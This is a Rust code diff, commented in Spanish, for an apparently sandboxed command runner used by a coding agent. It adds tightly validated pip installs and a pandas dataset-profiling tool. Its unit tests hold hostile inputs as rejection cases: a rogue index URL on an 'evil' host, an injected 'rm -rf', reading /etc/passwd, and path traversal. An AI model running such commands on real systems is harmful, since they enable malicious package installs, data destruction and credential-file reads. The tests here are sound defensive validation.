@@ -213,7 +213,7 @@ fn listar(ws: &Path, b: &Value) -> R<Value> {
                 return;
             }
             let n = e.file_name().to_string_lossy().to_string();
-            if n == ".git" || n == "node_modules" || n == "target" || n == ".next" || n == "__pycache__" || n == ".venv" {
+            if n == ".git" || n == "node_modules" || n == "target" || n == ".next" || n == "__pycache__" || n == ".venv" || n == ".pydeps" {
                 continue;
             }
             let p = e.path();
@@ -1084,6 +1084,167 @@ fn token_seguro(t: &str) -> bool {
 
 /// Lista CERRADA de comandos. Se ejecutan directamente (sin shell): no hay encadenado, redirecciones ni sustituciones.
 /// Sin red, salvo las instalaciones de dependencias (npm ci/install, cargo fetch, go mod download).
+/// ¿Es «nombre», «nombre==1.2», «nombre>=1,<2» o «nombre[extra]==1.2»? Sin URLs, rutas, marcadores ni opciones.
+fn especificacion_ok(s: &str) -> bool {
+    if s.is_empty() || s.len() > 120 {
+        return false;
+    }
+    let (cabeza, version) = match s.find(['=', '<', '>', '!', '~']) {
+        Some(i) => (&s[..i], &s[i..]),
+        None => (s, ""),
+    };
+    let (nombre, extras) = match cabeza.find('[') {
+        Some(i) => (&cabeza[..i], Some(&cabeza[i..])),
+        None => (cabeza, None),
+    };
+    let nombre_ok = !nombre.is_empty() && nombre.len() <= 80 && nombre.chars().next().map(|c| c.is_ascii_alphanumeric()).unwrap_or(false) && nombre.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c));
+    let extras_ok = extras.map(|e| e.len() > 2 && e.starts_with('[') && e.ends_with(']') && e[1..e.len() - 1].chars().all(|c| c.is_ascii_alphanumeric() || ",._-".contains(c))).unwrap_or(true);
+    let version_ok = version.is_empty()
+        || version.split(',').all(|v| {
+            let sin_op = ["==", "~=", ">=", "<=", "!=", "<", ">"].iter().find_map(|op| v.strip_prefix(op));
+            sin_op.map(|n| !n.is_empty() && n.chars().all(|c| c.is_ascii_alphanumeric() || ".*+".contains(c))).unwrap_or(false)
+        });
+    nombre_ok && extras_ok && version_ok
+}
+
+/// pip install de paquetes con nombre válido o de un requirements.txt del repositorio. SOLO ruedas binarias (no se ejecuta código de instalación) y a la
+/// carpeta .pydeps del repositorio, que no se commitea. Necesita internet, como npm ci.
+fn permitir_pip(resto: &str) -> R<Permitido> {
+    let t: Vec<&str> = resto.split_whitespace().collect();
+    let invalido = || -> R<Permitido> { Err("pip solo admite «pip install <paquete[==versión]> …» o «pip install -r <archivo>.txt» (sin URLs, rutas, -e ni otras opciones).".into()) };
+    if t.is_empty() || t.len() > 30 {
+        return invalido();
+    }
+    let mut args: Vec<String> = ["python", "-m", "pip", "install", "--only-binary=:all:", "--target", ".pydeps", "--upgrade", "--no-input", "--disable-pip-version-check", "--no-cache-dir"].iter().map(|s| s.to_string()).collect();
+    if t[0] == "-r" {
+        let f = t.get(1).copied().unwrap_or("");
+        let ok = t.len() == 2 && f.ends_with(".txt") && !f.starts_with('/') && !f.split('/').any(|s| s == "..") && f.chars().all(|c| c.is_ascii_alphanumeric() || "_./-".contains(c));
+        if !ok {
+            return invalido();
+        }
+        args.extend(["-r".to_string(), f.to_string()]);
+    } else {
+        if !t.iter().all(|x| especificacion_ok(x)) {
+            return invalido();
+        }
+        args.extend(t.iter().map(|s| s.to_string()));
+    }
+    Ok(Permitido { imagen: "python:3.12-bookworm", args, red: true })
+}
+
+/// Un requirements.txt solo puede nombrar paquetes del índice (nada de URLs, -e, --index-url ni marcadores).
+fn validar_requisitos(ws: &Path, ruta: &str) -> R<()> {
+    let p = seguro(ws, ruta)?;
+    let texto = std::fs::read_to_string(&p).map_err(|_| format!("No existe {ruta}."))?;
+    for (i, l) in texto.lines().enumerate() {
+        let l = l.split(" #").next().unwrap_or("").trim();
+        if l.is_empty() || l.starts_with('#') {
+            continue;
+        }
+        if !especificacion_ok(l) {
+            return Err(format!("{ruta}, línea {}: «{l}» no es un paquete simple (sin URLs, -e, opciones ni marcadores).", i + 1));
+        }
+    }
+    Ok(())
+}
+
+/// Carpetas que nunca deben entrar a un commit (dependencias y cachés de Python).
+async fn excluir_locales(ws: &Path) {
+    let Ok(p) = git(&["rev-parse", "--git-path", "info/exclude"], ws).await else { return };
+    let p = p.trim();
+    let ruta = if Path::new(p).is_absolute() { PathBuf::from(p) } else { ws.join(p) };
+    let actual = std::fs::read_to_string(&ruta).unwrap_or_default();
+    let mut nuevo = String::new();
+    for l in [".pydeps/", ".venv/", "__pycache__/", "*.pyc"] {
+        if !actual.lines().any(|x| x == l) {
+            nuevo.push_str(l);
+            nuevo.push('\n');
+        }
+    }
+    if !nuevo.is_empty() {
+        if let Some(d) = ruta.parent() {
+            let _ = std::fs::create_dir_all(d);
+        }
+        let _ = std::fs::write(&ruta, format!("{actual}{nuevo}"));
+    }
+}
+
+const PERFIL_PY: &str = r#"
+import sys
+try:
+    import pandas as pd
+except ImportError:
+    print("Falta pandas: instálalo con dev_ejecutar «pip install pandas» (y pyarrow para archivos parquet).")
+    sys.exit(2)
+ext = RUTA.rsplit('.', 1)[-1].lower()
+if ext == 'csv':
+    df = pd.read_csv(RUTA, nrows=MAX)
+elif ext == 'tsv':
+    df = pd.read_csv(RUTA, sep='\t', nrows=MAX)
+elif ext == 'parquet':
+    df = pd.read_parquet(RUTA).head(MAX)
+elif ext == 'jsonl':
+    df = pd.read_json(RUTA, lines=True, nrows=MAX)
+else:
+    df = pd.read_json(RUTA).head(MAX)
+n = len(df)
+print(f"Filas leídas: {n} (tope {MAX}) · Columnas: {df.shape[1]} · Filas duplicadas: {int(df.duplicated().sum())} · Memoria aprox.: {df.memory_usage(deep=True).sum() / 1e6:.1f} MB")
+print()
+print("COLUMNA | TIPO | NULOS | ÚNICOS | ESTADÍSTICAS O EJEMPLOS")
+for c in df.columns:
+    s = df[c]
+    nul = int(s.isna().sum())
+    uni = int(s.nunique(dropna=True))
+    if pd.api.types.is_bool_dtype(s):
+        extra = ", ".join(f"{k}: {v}" for k, v in s.value_counts().items())
+    elif pd.api.types.is_numeric_dtype(s):
+        q1, q3 = s.quantile(.25), s.quantile(.75)
+        iqr = q3 - q1
+        at = int(((s < q1 - 1.5 * iqr) | (s > q3 + 1.5 * iqr)).sum()) if iqr == iqr else 0
+        extra = f"mín {s.min():.4g} · mediana {s.median():.4g} · media {s.mean():.4g} · máx {s.max():.4g} · desv {s.std():.4g} · atípicos (IQR) {at}"
+    elif pd.api.types.is_datetime64_any_dtype(s):
+        extra = f"{s.min()} → {s.max()}"
+    else:
+        extra = ", ".join(map(str, s.dropna().astype(str).value_counts().head(5).index))[:120]
+    print(f"{c} | {s.dtype} | {nul} ({100 * nul / max(n, 1):.1f}%) | {uni} | {extra}")
+cons = [c for c in df.columns if df[c].nunique(dropna=False) <= 1]
+if cons:
+    print("\nColumnas constantes:", ", ".join(map(str, cons)))
+altos = [c for c in df.columns if df[c].isna().mean() > 0.4]
+if altos:
+    print("Columnas con más del 40% de nulos:", ", ".join(map(str, altos)))
+num = df.select_dtypes('number')
+if num.shape[1] >= 2:
+    cor = num.corr().abs()
+    cols = list(cor.columns)
+    pares = [(a, b, cor.loc[a, b]) for i, a in enumerate(cols) for b in cols[i + 1:] if cor.loc[a, b] > 0.9]
+    if pares:
+        print("Pares muy correlacionados (>0.9):", "; ".join(f"{a}~{b} ({v:.2f})" for a, b, v in pares[:10]))
+"#;
+
+/// Perfil de calidad de un conjunto de datos del repositorio (csv, tsv, parquet, json, jsonl): tamaño, tipos, nulos, duplicados, atípicos y correlaciones.
+async fn perfil(ws: &Path, sol: &str, sid: &str, b: &Value) -> R<Value> {
+    let ruta = txt(b, "ruta");
+    if es_secreto(&ruta) || ruta.is_empty() || !ruta.chars().all(|c| c.is_ascii_alphanumeric() || "_./-".contains(c)) {
+        return Err("Ruta inválida: usa una ruta relativa del repositorio (letras, números, _ . - y /).".into());
+    }
+    let p = seguro(ws, &ruta)?;
+    if !p.is_file() {
+        return Err(format!("No existe el archivo {ruta}."));
+    }
+    let ext = ruta.rsplit('.').next().unwrap_or("").to_lowercase();
+    if !["csv", "tsv", "parquet", "json", "jsonl"].contains(&ext.as_str()) {
+        return Err("Formato no admitido: csv, tsv, parquet, json o jsonl.".into());
+    }
+    let max = b["max_filas"].as_u64().unwrap_or(200_000).clamp(1_000, 2_000_000);
+    let codigo = format!("RUTA = {ruta:?}\nMAX = {max}\n{PERFIL_PY}");
+    let mut r = ejecutar(ws, sol, sid, &json!({ "codigo": codigo, "lenguaje": "python", "timeout": 180 })).await?;
+    if let Some(t) = r["texto"].as_str() {
+        r["texto"] = json!(format!("PERFIL DE {ruta}\n{t}"));
+    }
+    Ok(r)
+}
+
 /// Un filtro de salida («| head -n 20»). Lo aplica el servidor sobre el texto que devolvió el comando: no hay shell ni tuberías reales.
 #[derive(Debug, PartialEq)]
 enum Filtro {
@@ -1221,13 +1382,18 @@ fn permitir(comando: &str) -> R<Permitido> {
     if let Some(r) = c.strip_prefix("curl ") {
         return permitir_curl(r.trim());
     }
+    for pre in ["pip install ", "pip3 install ", "python -m pip install ", "python3 -m pip install "] {
+        if let Some(r) = c.strip_prefix(pre) {
+            return permitir_pip(r.trim());
+        }
+    }
     let t: Vec<&str> = c.split_whitespace().collect();
     if !t.iter().all(|x| token_seguro(x)) {
         return Err("El comando tiene caracteres no permitidos: se ejecuta tal cual, sin shell (nada de &&, ;, >, $, comillas ni rutas con «..» o absolutas). Para filtrar la salida puedes usar «| head|tail|grep|wc -l|sort|uniq»; para código suelto usa los campos codigo y lenguaje.".into());
     }
     let resto = |desde: usize| -> Vec<String> { t.iter().skip(desde).map(|s| s.to_string()).collect() };
     let con = |base: &[&str], extra: Vec<String>| -> Vec<String> { base.iter().map(|s| s.to_string()).chain(extra).collect() };
-    let lista = "npm test | npm run <cualquier script de package.json> | curl [-I] <url> (solo con red=true y confirmación) | node|python|bash <archivo del repositorio> | npx tsx <archivo.ts> | make [objetivo] | npm ci | npm install (siempre con --ignore-scripts) | npm rebuild [paquete] | npx <tsc|eslint|jest|vitest|prettier> … | npx prisma generate | npx prisma db push | npx prisma migrate deploy (estos dos contra la base de pruebas) | cargo <test|check|build|clippy|fmt|fetch> | go <test|build|vet> | go mod download | pytest | python -m <pytest|unittest|ruff|mypy>";
+    let lista = "npm test | npm run <cualquier script de package.json> | curl [-I] <url> (solo con red=true y confirmación) | node|python|bash <archivo del repositorio> | npx tsx <archivo.ts> | make [objetivo] | npm ci | npm install (siempre con --ignore-scripts) | npm rebuild [paquete] | npx <tsc|eslint|jest|vitest|prettier> … | npx prisma generate | npx prisma db push | npx prisma migrate deploy (estos dos contra la base de pruebas) | cargo <test|check|build|clippy|fmt|fetch> | go <test|build|vet> | go mod download | pip install <paquetes> | pip install -r <archivo>.txt (solo ruedas, a la carpeta .pydeps) | pytest | python -m <pytest|unittest|ruff|mypy>";
     let nada = || -> R<Permitido> { Err(format!("Comando fuera de la lista permitida. Se permite: {lista}.")) };
     match (t.first().copied(), t.get(1).copied()) {
         (Some("npm"), Some("test")) => Ok(Permitido { imagen: "node:22-bookworm", args: con(&["npm", "test"], resto(2)), red: false }),
@@ -1270,6 +1436,12 @@ async fn ejecutar(ws: &Path, sol: &str, sid: &str, b: &Value) -> R<Value> {
     if p.args.first().map(String::as_str) == Some("curl") && !aprobado {
         return Err("curl necesita internet: pídelo con red=true y un administrador debe confirmarlo.".into());
     }
+    if p.args.get(2).map(String::as_str) == Some("pip") {
+        if let Some(i) = p.args.iter().position(|a| a == "-r") {
+            validar_requisitos(ws, p.args.get(i + 1).map(String::as_str).unwrap_or(""))?;
+        }
+    }
+    excluir_locales(ws).await;
     let con_red = p.red || aprobado;
     let svcs = servicios_activos(sid).await;
     let vars = variables_de(sol);
@@ -1287,6 +1459,12 @@ async fn ejecutar(ws: &Path, sol: &str, sid: &str, b: &Value) -> R<Value> {
     a.push(if con_red { "--network=bridge".into() } else if !svcs.is_empty() { format!("--network={RED_INTERNA}") } else { "--network=none".into() });
     for (k, v) in &entorno {
         a.extend(["-e".to_string(), format!("{k}={v}")]);
+    }
+    if p.imagen.starts_with("python") {
+        // Las dependencias de pip viven en .pydeps (dentro del repositorio); matplotlib sin pantalla; hilos acotados al límite de CPU
+        for e in ["PYTHONPATH=/work/.pydeps", "PATH=/work/.pydeps/bin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "PYTHONDONTWRITEBYTECODE=1", "MPLBACKEND=Agg", "MPLCONFIGDIR=/tmp/mpl", "OMP_NUM_THREADS=2", "OPENBLAS_NUM_THREADS=2"] {
+            a.extend(["-e".to_string(), e.to_string()]);
+        }
     }
     if p.imagen.starts_with("rust") {
         a.extend(["-v".to_string(), "dev-cargo-registry:/usr/local/cargo/registry".to_string()]);
@@ -1425,6 +1603,7 @@ pub async fn manejar(st: &AppState, accion: &str, b: &Value) -> R<Value> {
     }
     let (ws, rama, raiz) = espacio(st, &sol, &sid).await?;
     match accion {
+        "perfil" => perfil(&ws, &sol, &sid, b).await,
         "mover" => mover(&ws, b),
         "borrar" => borrar(&ws, b),
         "git" => git_avanzado(st, &ws, b).await,
@@ -1492,6 +1671,36 @@ mod pruebas {
         assert!(editar(&base, &json!({ "ruta": "a/b/c.txt", "buscar": "nada", "reemplazar": "x" })).is_err());
         assert!(escribir(&base, &json!({ "ruta": ".env", "contenido": "X=1" })).is_err());
         assert!(leer(&base, &json!({ "ruta": "a/b/c.txt", "desde": 2, "hasta": 2 })).unwrap()["texto"].as_str().unwrap().contains("2\tDOS"));
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn pip_solo_instala_ruedas_de_paquetes_con_nombre_valido() {
+        for ok in ["pip install pandas", "pip install pandas scikit-learn==1.5.2 numpy>=1.26", "pip install scipy>=1.10,<2", "python -m pip install matplotlib", "pip3 install -r requirements.txt", "pip install -r datos/req.txt"] {
+            let p = permitir(ok).unwrap_or_else(|e| panic!("{ok}: {e}"));
+            assert!(p.red && p.args.contains(&"--only-binary=:all:".to_string()) && p.args.contains(&".pydeps".to_string()), "{ok}");
+        }
+        for mal in [
+            "pip install", "pip install git+https://x.com/y", "pip install https://x.com/y.whl", "pip install -e .", "pip install pandas --index-url http://evil", "pip install pandas; rm -rf x", "pip install -r /etc/passwd", "pip install -r ../x.txt",
+            "pip install -r req.sh", "pip install foo@bar", "pip install pandas -r a.txt", "pip install ./local", "pip uninstall pandas", "pip download pandas", "pip install pandas==", "pip install =1.0",
+        ] {
+            assert!(permitir(mal).is_err(), "{mal}");
+        }
+        assert!(especificacion_ok("uvicorn[standard]==0.30.0") && !especificacion_ok("pandas ; python_version<'3.12'") && !especificacion_ok("--hash=sha256:aa") && !especificacion_ok("-e ."));
+    }
+
+    #[test]
+    fn un_requirements_solo_puede_nombrar_paquetes_del_indice() {
+        let base = std::env::temp_dir().join(format!("req-{}", std::process::id()));
+        std::fs::create_dir_all(&base).unwrap();
+        std::fs::write(base.join("ok.txt"), "# datos\npandas==2.2.2  # tablas\nscikit-learn>=1.4\n\nnumpy\n").unwrap();
+        std::fs::write(base.join("mal1.txt"), "pandas\n--index-url http://evil/simple\n").unwrap();
+        std::fs::write(base.join("mal2.txt"), "pkg @ https://evil/x.whl\n").unwrap();
+        std::fs::write(base.join("mal3.txt"), "-e git+https://x/y\n").unwrap();
+        assert!(validar_requisitos(&base, "ok.txt").is_ok());
+        for m in ["mal1.txt", "mal2.txt", "mal3.txt", "no_existe.txt"] {
+            assert!(validar_requisitos(&base, m).is_err(), "{m}");
+        }
         let _ = std::fs::remove_dir_all(&base);
     }
 
